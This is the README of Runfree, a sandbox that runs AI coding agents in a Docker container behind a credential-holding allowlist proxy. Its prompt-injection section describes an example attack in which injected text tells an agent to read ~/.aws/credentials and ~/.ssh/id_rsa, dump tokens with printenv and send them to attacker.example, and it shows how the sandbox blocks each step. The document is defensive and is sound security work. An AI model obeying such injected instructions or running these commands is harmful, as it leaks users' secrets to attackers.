<p align="center">
  <img src="docs/logo.png" alt="Runfree: a sandbox for AI coding agents" width="200" />
</p>
<h1 align="center">Runfree: a secure sandbox for Claude Code, Codex, and Pi</h1>
<h3 align="center">Let your coding agent run without permission prompts, in a container with no open internet and no access to your API tokens</h3>
<p align="center">
<a href="https://github.com/genged/runfree/actions/workflows/test.yml">
  <img src="https://github.com/genged/runfree/actions/workflows/test.yml/badge.svg" alt="Test status" />
</a>
<a href="https://github.com/genged/runfree/actions/workflows/release.yml">
  <img src="https://github.com/genged/runfree/actions/workflows/release.yml/badge.svg" alt="Release status" />
</a>
<a href="https://github.com/genged/runfree/releases/latest">
  <img src="https://img.shields.io/github/v/release/genged/runfree?sort=semver" alt="Latest release" />
</a>
<img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" />
</p>

Runfree starts Claude Code, Codex, or Pi inside a per-project Docker workspace.
Claude Code runs with `--dangerously-skip-permissions` and Codex with
`--dangerously-bypass-approvals-and-sandbox`, because the container is the
sandbox. The container has no route to the internet except a proxy, which
allows only the exact hostnames you approved on the host and attaches your
real service credentials itself. The agent never holds them.

- **No prompt-babysitting.** The agent edits files, installs packages, and runs
  tests without asking. It does that in a container, not in your shell.
- **Deny-by-default network.** Outbound HTTPS/WSS reaches only hosts you
  approved. The agent can edit the policy file; editing it grants nothing.
- **API tokens stay out of reach.** A service token comes from
  `gh auth token`, 1Password, or an environment variable on your host. The
  agent's environment gets a placeholder. The agent's own Claude or Codex
  login is the exception: it lives in the project's agent state, where the
  agent can read it.

```bash
brew install genged/tap/runfree
cd ~/code/my-project
runfree init
runfree
```

`runfree init` opens a short wizard. It detects the project's package
ecosystems, Git remote hosts, and a GitHub CLI login, then offers a plan you
review before any policy or credential source is written.

Requires Apple Silicon macOS with Docker Desktop, or Linux (arm64 or x64, glibc)
with Docker Engine. Each claim above has a limit
worth knowing before you rely on it: see [Limitations](#limitations).

**New in 0.8.0:** Linux with Docker Engine, and 1Password sources for
scheduled runs that never prompt. See [what's new](docs/whats-new-0.8.0.md).

## What stops a prompt injection

A coding agent is useful because it can read your code, edit it, install
packages, run tests, and call APIs. Run it directly on your machine and all of
that happens with your shell's reach and your credentials. The usual answer is
a permission prompt for every command, which you either babysit or switch off.
Runfree moves the boundary instead.

Say an agent is fixing a failing build. It reads an issue comment, or a README
inside a dependency, that carries instructions aimed at it: collect this
machine's cloud keys and GitHub token and send them to `attacker.example`.
With prompts off on your host, that is three commands. Inside Runfree:

| The injected step | What happens |
| --- | --- |
| `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa` | File not found. Your home directory is not mounted. |
| `printenv`, looking for a GitHub token | A placeholder. The real value is held by the proxy. |
| `curl https://attacker.example` | 403 from the proxy, before any DNS lookup. |
| Connect straight to an IP address, skipping the proxy | No route. |
| Edit `.runfree/network-policy.json` to allow the host | No effect without your approval on the host. |

Afterwards, `runfree doctor` lists `attacker.example` among the blocked hosts
and prints the exact command that would allow it.

The same injection can still do two things. It can change files in your working
tree, and it can send data to a host you already allowed, for example by pushing
to a repository on an allowed Git host. `--write ask` and `--deny-git-push` on
`runfree host rules` narrow the second. The full table is
[What Stops What](docs/security.md#what-stops-what).

## Features

- **Push to GitHub and GitLab without handing over your token.** The proxy adds
  your token only to recognized git requests, `git@github.com:` remotes
  included, and each push can wait for your approval.
  [More](docs/cli.md#git-over-https-and-ssh-remotes)
- **Three agents and a shell, one sandbox.** `runfree claude`, `runfree codex`,
  `runfree pi`, and `runfree shell` share the project's policy. Each session
  gets its own container. [More](docs/cli.md#agent-runtime)
- **Scheduled agent runs.** `runfree run` runs one agent turn from launchd or a
  script, never prompts, and exits with a code a scheduler can act on.
  [More](docs/cli.md#headless-runs)
- **Whole ecosystems in one command.** `runfree service enable node` allows the
  hosts an ecosystem's tools need, so you are not hunting hostnames one 403 at
  a time. [More](docs/cli.md#services)
- **MCP servers: one review, one login.** `runfree mcp enable` reviews a
  server's hosts and credentials on one screen, and per-tool rules can hold or
  deny a single tool. [More](docs/cli.md#mcp)
- **Your dev server, database, or simulator, from the agent.**
  `runfree host-service add` lets the agent reach one port on your machine's
  loopback. [More](docs/cli.md#host-services)
- **Writes wait for you.** Reads go straight through; a write to a host you
  marked `--write ask` waits for `runfree approve`.
  [More](docs/cli.md#approve-on-write)
- **Credentials from wherever you keep them.** A host command, an environment
  variable, 1Password, or a JWT signed on the host. OAuth refresh tokens stay
  in the proxy. [More](docs/cli.md#credentials)
- **Read-only and path-scoped hosts.** Limit a host to the methods and paths
  you name, or keep fetch and refuse pushes. [More](docs/cli.md#manage-hosts)
- **Find out what a project needs.** Audit mode records traffic for a fixed
  window and suggests exact `runfree host add` commands.
  [More](docs/cli.md#audit-network-discovery)
- **Team policy in git.** Commit `.runfree/` and review policy like code; a
  pull request cannot grant network access by itself.
  [More](docs/team-workflow.md)
- **Resume, preview, paste, and see the screen.** `runfree resume`,
  `runfree forward 3000`, `runfree inbox paste`, and `runfree vnc`.
  [More](docs/cli.md#optional-runtime-helpers)

`runfree help <topic>` has task guides for each of these in the terminal.

## Why not a plain container?

A plain Docker container or devcontainer keeps the agent out of your home
directory. By default it can still reach any host on the internet, and any
token you pass in is readable inside it. The built-in sandboxes of Claude Code
and Codex restrict commands on your host, one agent at a time. Runfree turns
those prompts off and puts one boundary around the whole container instead:

| | Plain container | Runfree |
| --- | --- | --- |
| Home directory and host secrets | Not mounted | Not mounted |
| Outbound network | Open by default | Exact approved hostnames only, through the proxy |
| Service tokens | Readable inside, if you pass them in | Held by the proxy; the agent sees a placeholder |

## Who it is for

Individual developers running Claude Code, Codex, or Pi on their own projects,
who want the agent's tools in a container and their service credentials out of
its reach. Teams can commit policy and review it like code (see
[`docs/team-workflow.md`](docs/team-workflow.md)), but the primary case is one
developer and one project.

Runfree is not a VM boundary, not a cloud service, and not a substitute for
reading what an agent wrote. It narrows the default blast radius.

## Quickstart

### 1. Install

Runfree publishes binaries for **Apple Silicon macOS**, supported with
**Docker Desktop**, and for **Linux** on arm64 and x64, supported with native
**Docker Engine** and Docker Compose. The Linux binaries are not signed and
need glibc, so musl distributions such as Alpine must build from source. You
also need `git`: Git 2.48 or newer gives full worktree support. Older Git still works, with limits described in
[Git worktrees](docs/cli.md#git-worktrees).

On macOS with Homebrew:

```bash
brew install genged/tap/runfree
```

On Linux, or on macOS without Homebrew:

```bash
curl -fsSL https://raw.githubusercontent.com/genged/runfree/main/scripts/install.sh | bash
```

That downloads the latest release for your architecture, verifies its SHA-256
checksum against the published manifest, and installs to `~/.local/bin/runfree`.
It needs `bash`, not `sh`.

To build from source instead, you need Node 22 and the pnpm version in
`package.json` (`packageManager`). The build
fetches the Bun version in `.bun-version` through `./bunw`
(see [CONTRIBUTING.md](CONTRIBUTING.md)):

```bash
pnpm install --frozen-lockfile
pnpm run build:bin
./dist/runfree version
```

Intel macOS can also be built from source, but building is not a support
claim there.

### 2. Initialize a project

```bash
cd ~/code/my-project
runfree init
```

`init` writes project-local config and deny-all desired policy:

```text
.runfree/
  .gitignore
  runfree.json
  network-policy.json
```

On a terminal it then continues into the wizard. Each item it offers is one you
can untick: a curated service for each ecosystem it found (a lockfile or
manifest is enough), the Git remote's host, and, when `gh` is installed, a
`github-cli` credential source bound to the `github` service. `runfree init --yes`
and non-interactive runs write the files above and skip the wizard.

Runtime state lives outside the repository, under your XDG state root, for
example `~/.local/state/runfree/projects/<project-hash>/`.

### 3. Run an agent

```bash
runfree          # the configured default agent
runfree claude
runfree codex
runfree pi
```

The first start asks you to review the policy before anything runs. How the
agent then logs in depends on the agent:

- **Claude Code and Codex** log in the way they always do, with your
  subscription or account, on first start in each project. The review
  includes the hosts that login and the model API need, so there is nothing
  to configure. The login is stored in that project's agent state, inside
  the agent's reach, not behind the proxy.
- **Pi** first start reviews only the `agent-pi` service, which allows Pi's
  read-only model catalog. A model provider needs its API-key service, for
  example
  `runfree service enable anthropic --from-env ANTHROPIC_API_KEY`. Pi then
  sees a placeholder `ANTHROPIC_API_KEY`, and the proxy swaps in the real key
  on requests to `api.anthropic.com`.

Around a session:

```bash
runfree status
runfree shell
runfree doctor            # why a request was blocked, and what would allow it
runfree logs proxy --verbose
runfree stop
```

### 4. Add network access and credentials

The wizard covers the common cases. Everything it does is also a command, for
changes after `init` or for projects set up without it.

Credentials are resolved on the host and injected only by the proxy. To reuse a
GitHub CLI login without the credential entering the container, which also
turns on git push over HTTPS:

```bash
runfree credential source add github-cli -- gh auth token
runfree service enable github --from-source github-cli
```

To allow a single host, read-only:

```bash
runfree host add api.example.com --read-only
runfree host explain api.example.com
```

[`docs/cli.md`](docs/cli.md) is the full command reference.

## How it works

The agent container is untrusted. The proxy container is the trust boundary.
The host owns approval.

```text
 HOST (trusted: you and the runfree CLI)
   approvals, effective policy, credential sources
        |                                    |
        | starts and admits sessions         | policy and credentials
        v                                    v
 +---------------------------+       +---------------------------+
 | agent container           |       | proxy container           |
 | UNTRUSTED                 |       | TRUST BOUNDARY            |
 |                           |       |                           |
 | Claude Code / Codex / Pi  | HTTPS | 1. exact-host allowlist   |
 | /workspace (your project) |  WSS  | 2. per-host request rules |     approved
 | placeholders, no real     |------>| 3. write approval         |---> hosts
 | credentials               |       | 4. attach credential      |     only
 +---------------------------+       +---------------------------+
        X no direct egress, no route to the host gateway
```

- Direct agent egress and host-gateway egress are blocked by Docker topology.
- Outbound HTTPS/WSS goes through the proxy, which checks the allowlist, then
  the per-host request rules, then write approval, and only then reads a credential.
- Desired policy is writable from the container; effective policy is not
  reachable from it.
- Dependency directories such as `node_modules` live in Runfree-owned volumes
  rather than your checkout.

That is what makes the confused-deputy case bounded: a compromised agent can ask
for an allowed request, but it cannot read the proxy-held credential or widen the
policy from inside the container.

See [`docs/architecture.md`](docs/architecture.md) for the runtime model.

### How it is tested

`make test-runtime-core` runs against a real Docker daemon and proves the trust
boundary: the network shape and dropped capabilities, egress containment,
request rules and write approval, that policy edits from the agent are inert,
and per-session admission. A security test has to show the refusal happens
before the side effect: before a DNS lookup, an upstream connection, or a
credential read.

[What Stops What](docs/security.md#what-stops-what) maps each attack to the
control that stops it. [What Runfree Does Not Prove](docs/security.md#what-runfree-does-not-prove)
lists the gaps, including that the live suite runs by hand on a Docker host and
is not part of the release pipeline.

## Limitations

Worth reading before you rely on it. The full threat model is
[`docs/security.md`](docs/security.md).

- **Your working tree is writable**, including `.git`. Runfree bounds the
  network, not the repository.
- **Native Claude and Codex logins are not proxy-held.** They live in
  per-project agent state, inside the agent's reach. Only proxy-managed service
  credentials get that boundary.
- **An allowed host stays allowed.** Policy controls destination and request
  shape, not the content of what an agent sends to a destination you approved.
  A broad multi-tenant host is a broad allowance.
- **Project image builds run before the sandbox exists**, on the host Docker
  daemon. Review project Dockerfiles as host-side decisions.
- **Audit mode widens what the agent can reach** while it is on. It is a
  time-boxed discovery tool, not a default.
- **Docker and the host are trusted.** This is not VM isolation.

## Development

```bash
pnpm install --frozen-lockfile
make test
```

Runtime, proxy, firewall, mount, or credential changes also need a Docker host
and `make test-runtime-core`. [`CONTRIBUTING.md`](CONTRIBUTING.md) has the
rest, including what review will ask about.

## Further reading

- [`docs/index.md`](docs/index.md) — the documentation map
- [`docs/project-brief.md`](docs/project-brief.md) — product model and release scope
- [`docs/architecture.md`](docs/architecture.md) — runtime, proxy, policy, and state
- [`docs/security.md`](docs/security.md) — threat model and verification
- [`docs/cli.md`](docs/cli.md) — full command reference
- [`docs/troubleshooting.md`](docs/troubleshooting.md) — refusals and recovery
- [`docs/whats-new-0.8.0.md`](docs/whats-new-0.8.0.md) — current release
- [`AGENTS.md`](AGENTS.md) — guidance for coding agents working in this repo
